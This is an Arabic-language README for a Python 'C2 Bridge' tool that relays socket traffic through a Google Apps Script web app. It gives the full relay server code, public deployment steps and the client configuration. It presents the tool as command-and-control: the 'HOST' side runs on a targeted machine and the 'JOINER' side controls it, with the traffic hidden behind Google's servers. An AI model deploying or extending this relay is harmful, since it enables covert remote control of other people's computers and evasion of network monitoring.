![](Screenshot%20from%202026-04-25%2021-56-59.png)

# 🚀 Google apps C2 Bridge 
نظام **C2 Bridge** احترافي مبني بلغة بايثون، يعتمد على **Google Apps Script** كخادم وسيط (Relay Server). هذا النظام مصمم لنقل بيانات الـ Sockets والاتصالات بذكاء وسرعة فائقة حتى في ظروف الشبكة المتقلبة.

---

## 🛠 المميزات التقنية (Technical Features)

* **Long Polling Support:** السيرفر ينتظر وجود بيانات قبل الرد، مما يقلل من استهلاك الموارد ويزيد الاستقرار.
* **Data Compression:** يستخدم ضغط `zlib` لتقليل حجم الحزم المرسلة، مما يسرع عملية النقل بنسبة تصل لـ 60%.
* **Session Isolation (SID):** نظام معرفات فريدة لكل جلسة لمنع تداخل البيانات بين المستخدمين.
* **Multi-Threading:** إدارة ذكية للخيوط (Threads) لضمان عدم تجميد واجهة البرنامج (UI) أثناء ضغط العمل.
* **Auto-Redirect Handling:** معالجة تلقائية لتحويلات روابط جوجل (302 Redirect).

---

## 🏗️ إعداد الخادم (Google Apps Script) - خطوة بخطوة

لجعل النظام يعمل، يجب عليك إعداد "المحرك" على سيرفرات جوجل أولاً:

### 1. إنشاء المشروع
* انتقل إلى [Google Apps Script](https://script.google.com/).
* اضغط على **New Project**.
* قم بتسمية المشروع مثلاً: `BayLak_C2_Server`.

### 2. إضافة كود السيرفر (`main.gs`)
* امسح أي كود موجود في المحرر.
* انسخ الكود التالي وضعه هناك:

```javascript
// كود سيرفر BayLak - الإصدار المستقر
var cache = CacheService.getScriptCache();

function doPost(e) {
  var d = JSON.parse(e.postData.contents);
  var group = d.group;
  var role = d.role;
  var sid = d.sid || "default";
  var payload = d.payload || "";

  var key_h2j = group + "_" + sid + "_h2j";
  var key_j2h = group + "_" + sid + "_j2h";

  if (role == "HOST") {
    if (payload !== "") cache.put(key_h2j, payload, 60);
    // نظام الانتظار الذكي (Long Polling)
    for (var i = 0; i < 5; i++) {
      var data = cache.get(key_j2h);
      if (data) {
        cache.remove(key_j2h);
        return ContentService.createTextOutput(JSON.stringify({data: data})).setMimeType(ContentService.MimeType.JSON);
      }
      Utilities.sleep(1000); // انتظر ثانية وحاول مجدداً
    }
  } else if (role == "JOINER") {
    if (payload !== "") cache.put(key_j2h, payload, 60);
    for (var i = 0; i < 5; i++) {
      var data = cache.get(key_h2j);
      if (data) {
        cache.remove(key_h2j);
        return ContentService.createTextOutput(JSON.stringify({data: data})).setMimeType(ContentService.MimeType.JSON);
      }
      Utilities.sleep(1000);
    }
  }
  return ContentService.createTextOutput(JSON.stringify({data: ""})).setMimeType(ContentService.MimeType.JSON);
}

```
### 3. النشر (Deployment)
اضغط على زر Deploy ثم New Deployment.

اختر النوع (Select type) ليكون Web App.

Execute as: اختر "Me".

Who has access: اختر "Anyone" (هذا الخيار ضروري جداً).

اضغط Deploy وانسخ الرابط (Web App URL) الناتج.

💻 إعداد جانب العميل (Python)
المتطلبات:
قم بتثبيت المكتبات اللازمة عبر الـ Terminal:
```
Bash
pip install customtkinter requests
```
ملف الإعدادات (config.py):
قم بإنشاء ملف باسم config.py في نفس مجلد البرنامج وضع فيه الرابط الذي نسخته:

## config.py
```
URL = "ضع_رابط_جوجل_هنا"
DEFAULT_GROUP = "BAYLAK_ROOM"
DEFAULT_IP = "127.0.0.1"
DEFAULT_PORT = "80"
```
### تشغيل البرنامج:
قم بتشغيل ملف البايثون الرئيسي. اختر HOST للجهاز المستهدف و JOINER لجهاز التحكم.

### 🛡️ نصائح للأداء الأقصى
الرابط: لا تشارك رابط الـ Web App مع أحد، فهو مفتاح الوصول لبياناتك.

السرعة: إذا واجهت تأخيراً، تأكد من أن قيمة الـ timeout في البايثون دائماً أعلى من مجموع وقت الـ sleep في جوجل.

المتعدد: يمكنك فتح أكثر من جلسة (Sessions) في نفس الوقت بفضل نظام الـ SID التلقائي.

### التطوير بواسطة
### BAYLAK 
